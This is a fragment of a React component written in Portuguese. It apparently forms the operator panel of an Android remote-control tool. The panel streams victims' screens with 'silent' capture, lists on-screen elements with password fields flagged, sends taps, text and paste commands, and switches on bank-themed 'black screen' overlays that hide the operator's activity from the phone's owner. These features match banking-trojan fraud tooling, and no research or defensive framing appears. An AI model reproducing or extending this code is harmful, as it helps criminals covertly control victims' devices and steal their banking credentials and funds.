                    <LatencyBadge lastActivityAt={cliente.lastActivityAt} isOnline={isOnline} />
                    <button
                      type="button"
                      onClick={() => onNavigateToDevice(cliente.deviceId)}
                      className="p-1 text-[#ef4444] hover:text-white hover:bg-[#121214] rounded-md transition-colors"
                      title="Abrir Central Completa do Aparelho"
                    >
                      <ExternalLink className="w-3.5 h-3.5" />
                    </button>
                    {devices.length > 1 && (
                      <button
                        type="button"
                        onClick={() => onRemoveDevice(cliente.deviceId)}
                        className="p-1 text-[#8b8b94] hover:text-[#ef4444] hover:bg-[#121214]/60 rounded-md transition-colors"
                        title="Fechar apenas esta tela"
                      >
                        <X className="w-3.5 h-3.5" />
                      </button>
                    )}
                  </div>
                </div>

                {/* VNC Screen + V2 Screen + Painel de Elementos */}
                <div className="relative flex-1 bg-[#100203] p-2 min-h-[380px] overflow-hidden">
                  <div className={`grid gap-2 h-full min-h-[400px] ${
                    showElementsList
                      ? 'grid-cols-1 md:grid-cols-3'
                      : viewMode === 'both' ? 'grid-cols-1 sm:grid-cols-2' : 'grid-cols-1'
                  }`}>
                    {/* Lado Esquerdo: VNC Normal */}
                    {(viewMode === 'both' || viewMode === 'vnc') && (
                      <div className="flex flex-col items-center justify-center bg-[#1a0503] rounded-md border border-[#2a2a31]/30 p-1.5 min-h-[360px]">
                        <div className="w-full text-center text-[10px] font-mono font-bold text-[#ef4444] py-1 mb-1 bg-[#121214]/90 rounded-md border border-[#2a2a31]/30 shadow-sm flex items-center justify-center gap-1">
                          <Tv className="w-3 h-3 text-[#ef4444]" />
                          <span>📺 VNC NORMAL (AO VIVO)</span>
                        </div>
                        <div className="flex-1 w-full flex items-center justify-center overflow-hidden">
                          <DeviceScreen
                            deviceId={cliente.deviceId}
                            onCommand={(cmd) => devicesAPI.sendCommand(cliente.deviceId, cmd)}
                            isBlackScreenActive={isBlack}
                            captureMethod="silent"
                          />
                        </div>
                      </div>
                    )}

                    {/* Lado Direito: Tela V2 */}
                    {(viewMode === 'both' || viewMode === 'v2') && (
                      <div className="flex flex-col items-center justify-center bg-[#1a0503] rounded-md border border-[#2a2a31]/30 p-1.5 min-h-[360px]">
                        <div className="w-full text-center text-[10px] font-mono font-bold text-teal-300 py-1 mb-1 bg-[#121214]/90 rounded-md border border-[#2a2a31]/30 shadow-sm flex items-center justify-center gap-1">
                          <Eye className="w-3 h-3 text-[#ef4444] animate-pulse" />
                          <span>👁️ TELA V2 (ESTRUTURA)</span>
                        </div>
                        <div className="flex-1 w-full flex items-center justify-center overflow-hidden">
                          <QuickV2Canvas
                            deviceId={cliente.deviceId}
                            onCommand={(cmd) => devicesAPI.sendCommand(cliente.deviceId, cmd)}
                            textScale={v2TextScale}
                            opacity={v2Opacity}
                            designTheme={v2DesignTheme}
                            cornerStyle={v2CornerStyle}
                            showGrid={v2ShowGrid}
                            showCoords={v2ShowCoords}
                            hideUntyped={v2HideUntyped}
                            onNodesExtracted={(nodes) => {
                              setExtractedNodesMap((prev) => ({ ...prev, [cliente.deviceId]: nodes }));
                            }}
                          />
                        </div>
                      </div>
                    )}

                    {/* 📋 Painel Lateral da V2: Lista de Elementos Clicáveis */}
                    {showElementsList && (
                      <div className="flex flex-col bg-[#1a0503] rounded-md border border-amber-500/30 p-2 min-h-[360px] font-mono text-xs overflow-hidden">
                        <div className="w-full text-center text-[10px] font-bold text-amber-300 py-1 mb-2 bg-amber-950/80 rounded-md border border-amber-500/30 flex items-center justify-center gap-1">
                          <List className="w-3.5 h-3.5 text-amber-400" />
                          <span>ELEMENTOS DA TELA ({filteredNodes.length})</span>
                        </div>

                        {/* Campo de Busca de Elementos */}
                        <div className="relative mb-2">
                          <Search className="w-3.5 h-3.5 absolute left-2 top-2.5 text-slate-400" />
                          <input
                            type="text"
                            placeholder="Filtrar por texto..."
                            value={elementSearchText}
                            onChange={(e) => setElementSearchText(e.target.value)}
                            className="w-full bg-[#121214] border border-amber-500/30 rounded-md pl-7 pr-2 py-1 text-[11px] text-white focus:outline-none focus:border-amber-400"
                          />
                        </div>

                        {/* Filtros de Categoria */}
                        <div className="flex items-center gap-1 mb-2 overflow-x-auto text-[10px]">
                          <button
                            type="button"
                            onClick={() => setElementFilterCategory('all')}
                            className={`px-2 py-0.5 rounded ${elementFilterCategory === 'all' ? 'bg-amber-500 text-black font-bold' : 'bg-[#121214] text-slate-400'}`}
                          >
                            Todos
                          </button>
                          <button
                            type="button"
                            onClick={() => setElementFilterCategory('interactive')}
                            className={`px-2 py-0.5 rounded ${elementFilterCategory === 'interactive' ? 'bg-[#ef4444] text-black font-bold' : 'bg-[#121214] text-slate-400'}`}
                          >
                            Botões
                          </button>
                          <button
                            type="button"
                            onClick={() => setElementFilterCategory('input')}
                            className={`px-2 py-0.5 rounded ${elementFilterCategory === 'input' ? 'bg-[#ef4444] text-black font-bold' : 'bg-[#121214] text-slate-400'}`}
                          >
                            Inputs
                          </button>
                        </div>

                        {/* Lista Scrollável de Elementos da V2 */}
                        <div className="flex-1 overflow-y-auto space-y-1 pr-1 max-h-[300px]">
                          {filteredNodes.length === 0 ? (
                            <p className="text-[#8b8b94] text-[11px] text-center pt-4">Nenhum elemento encontrado</p>
                          ) : (
                            filteredNodes.map((n, idx) => {
                              const label = (n.text || n.desc || n.hint || n.id || 'Elemento sem rótulo').trim();
                              const isClick = n.clickable || n.button;
                              const isPwd = n.password || n.editable;

                              return (
                                <div
                                  key={idx}
                                  onClick={() => clickNodeElement(cliente.deviceId, n)}
                                  className="p-1.5 bg-[#121214]/80 hover:bg-amber-950/70 border border-[#24242a] hover:border-amber-400 rounded-md flex items-center justify-between gap-1 cursor-pointer transition-all group"
                                  title="Clique para enviar toque diretamente neste elemento"
                                >
                                  <div className="min-w-0 flex items-center gap-1.5">
                                    <span>{isPwd ? '🔑' : isClick ? '👆' : '💬'}</span>
                                    <span className="text-[11px] font-bold text-white truncate group-hover:text-amber-300">
                                      {label}
                                    </span>
                                  </div>
                                  <span className="text-[9px] text-amber-400 bg-amber-950 px-1 py-0.5 rounded border border-amber-500/30 flex-shrink-0">
                                    Clicar
                                  </span>
                                </div>
                              );
                            })
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* ⌨️ Barra de Enviar Texto e Ações Rápidas (Embaixo do VNC / V2) */}
                <div className="p-2.5 bg-[#2c0903] border-t border-[#2a2a31]/25 flex flex-col sm:flex-row items-center gap-2 font-mono text-xs">
                  <div className="relative flex-1 w-full flex items-center gap-1">
                    <input
                      type="text"
                      placeholder={t('vnc.type_here')}
                      value={textInputsMap[cliente.deviceId] || ''}
                      onChange={(e) => setTextInputsMap((prev) => ({ ...prev, [cliente.deviceId]: e.target.value }))}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') handleSendText(cliente.deviceId);
                      }}
                      className="flex-1 bg-slate-950 border border-[#2a2a31]/40 rounded-md px-3 py-1.5 text-xs text-white placeholder-[#8b8b94] focus:outline-none focus:border-[#4a4a56] shadow-inner"
                    />
                    <button
                      type="button"
                      onClick={() => handleSendText(cliente.deviceId)}
                      className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#ef4444] text-[#10120a] font-bold rounded-md border border-[#4a4a56] shadow-[0_0_10px_rgba(239,68,68,0.3)] transition-all flex items-center gap-1 cursor-pointer active:scale-95 flex-shrink-0"
                      title={t('vnc.send_btn')}
                    >
                      <Send className="w-3.5 h-3.5" />
                      <span>{t('vnc.send_btn')}</span>
                    </button>
                  </div>

                  {/* Teclas de Ação Rápida */}
                  <div className="flex items-center gap-1 flex-wrap justify-end">
                    <button
                      type="button"
                      onClick={() => sendCommand(cliente.deviceId, 'KEY_CODE', { code: 66 })}
                      className="px-2 py-1 bg-[#121214] hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md text-[11px] font-bold transition-all flex items-center gap-1"
                      title="Enter"
                    >
                      <CornerDownLeft className="w-3 h-3 text-[#ef4444]" />
                      <span>Enter</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => sendCommand(cliente.deviceId, 'KEY_CODE', { code: 67 })}
                      className="px-2 py-1 bg-[#121214] hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md text-[11px] font-bold transition-all flex items-center gap-1"
                      title="Backspace"
                    >
                      <Delete className="w-3 h-3 text-[#ef4444]" />
                      <span>Del</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => {
                        const text = textInputsMap[cliente.deviceId] || '';
                        if (text) sendCommand(cliente.deviceId, 'PASTE', { text });
                      }}
                      className="px-2 py-1 bg-[#121214] hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md text-[11px] font-bold transition-all flex items-center gap-1"
                      title="Paste"
                    >
                      <Clipboard className="w-3 h-3 text-[#ef4444]" />
                      <span>Paste</span>
                    </button>

                    {/* 🎭 Seletor de Modelo de Tela Preta / Banco + Botão de Ativação */}
                    <div className="flex items-center gap-1 flex-wrap justify-end">
                      <select
                        value={selectedBlackPresetMap[cliente.deviceId] || 'standard'}
                        onChange={(e) => setSelectedBlackPresetMap((prev) => ({ ...prev, [cliente.deviceId]: e.target.value }))}
                        className="bg-[#121214] border border-[#2a2a31]/40 rounded-md px-2 py-1 text-[11px] text-[#ef4444] font-bold focus:outline-none max-w-[180px] sm:max-w-[210px] truncate cursor-pointer"
                        title="Tela Preta"
                      >
                        {BLACK_SCREEN_PRESETS.map((preset) => (
                          <option key={preset.id} value={preset.id}>
                            {preset.name}
                          </option>
                        ))}
                      </select>

                      <button
                        type="button"
                        onClick={() => toggleBlackScreen(cliente.deviceId)}
                        className={`px-2 py-1 rounded-md border text-[11px] font-bold transition-all flex items-center gap-1 cursor-pointer ${
                          isBlack
                            ? 'bg-[#ef4444] text-white border-[#3a3a44] shadow-[0_0_10px_rgba(239,68,68,0.5)] animate-pulse'
                            : 'bg-[#121214]/80 text-[#ef4444] border-[#2a2a31]/40 hover:bg-[#1a1a1e]'
                        }`}
                        title={t('vnc.black_screen')}
                      >
                        <Zap className="w-3 h-3 text-yellow-300" />
                        <span>{isBlack ? '🔴 ON' : '⚡ Black'}</span>
                      </button>
                    </div>
                  </div>
                </div>

                {/* Device Individual Footer Navigation */}
                <div className="px-3 py-1.5 bg-[#240703] border-t border-[#2a2a31]/15 flex items-center justify-between font-mono text-xs text-slate-400">
                  <div className="flex items-center gap-1">
                    <button
                      type="button"
                      onClick={() => sendCommand(cliente.deviceId, 'COMMAND_BACK')}
                      className="px-2.5 py-1 bg-[#121214]/90 hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md transition-all active:scale-95 flex items-center gap-1 text-[11px] font-bold"
                      title={t('vnc.back')}
                    >
                      <ArrowLeft className="w-3 h-3 text-[#ef4444]" />
                      <span>{t('vnc.back')}</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => sendCommand(cliente.deviceId, 'COMMAND_HOME')}
                      className="px-2.5 py-1 bg-[#121214]/90 hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md transition-all active:scale-95 flex items-center gap-1 text-[11px] font-bold"
                      title={t('vnc.home')}
                    >
                      <Home className="w-3 h-3 text-[#ef4444]" />
                      <span>{t('vnc.home')}</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => sendCommand(cliente.deviceId, 'COMMAND_RECENTS')}
                      className="px-2.5 py-1 bg-[#121214]/90 hover:bg-[#121214] text-[#ef4444] border border-[#2a2a31]/30 rounded-md transition-all active:scale-95 flex items-center gap-1 text-[11px] font-bold"
                      title={t('vnc.recents')}
                    >
                      <Layers className="w-3 h-3 text-[#ef4444]" />
                      <span>{t('vnc.recents')}</span>
                    </button>
                  </div>

                  <button
                    type="button"
                    onClick={() => sendCommand(cliente.deviceId, 'REQUEST_VNC_FRAME')}
                    className="p-1 bg-[#121214]/80 hover:bg-[#1a1a1e] text-[#ef4444] border border-[#2a2a31]/40 rounded-md transition-all active:scale-95"
                    title="Atualizar Frame"
                  >
                    <RefreshCw className={`w-3 h-3 text-[#ef4444] ${isSending ? 'animate-spin' : ''}`} />
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

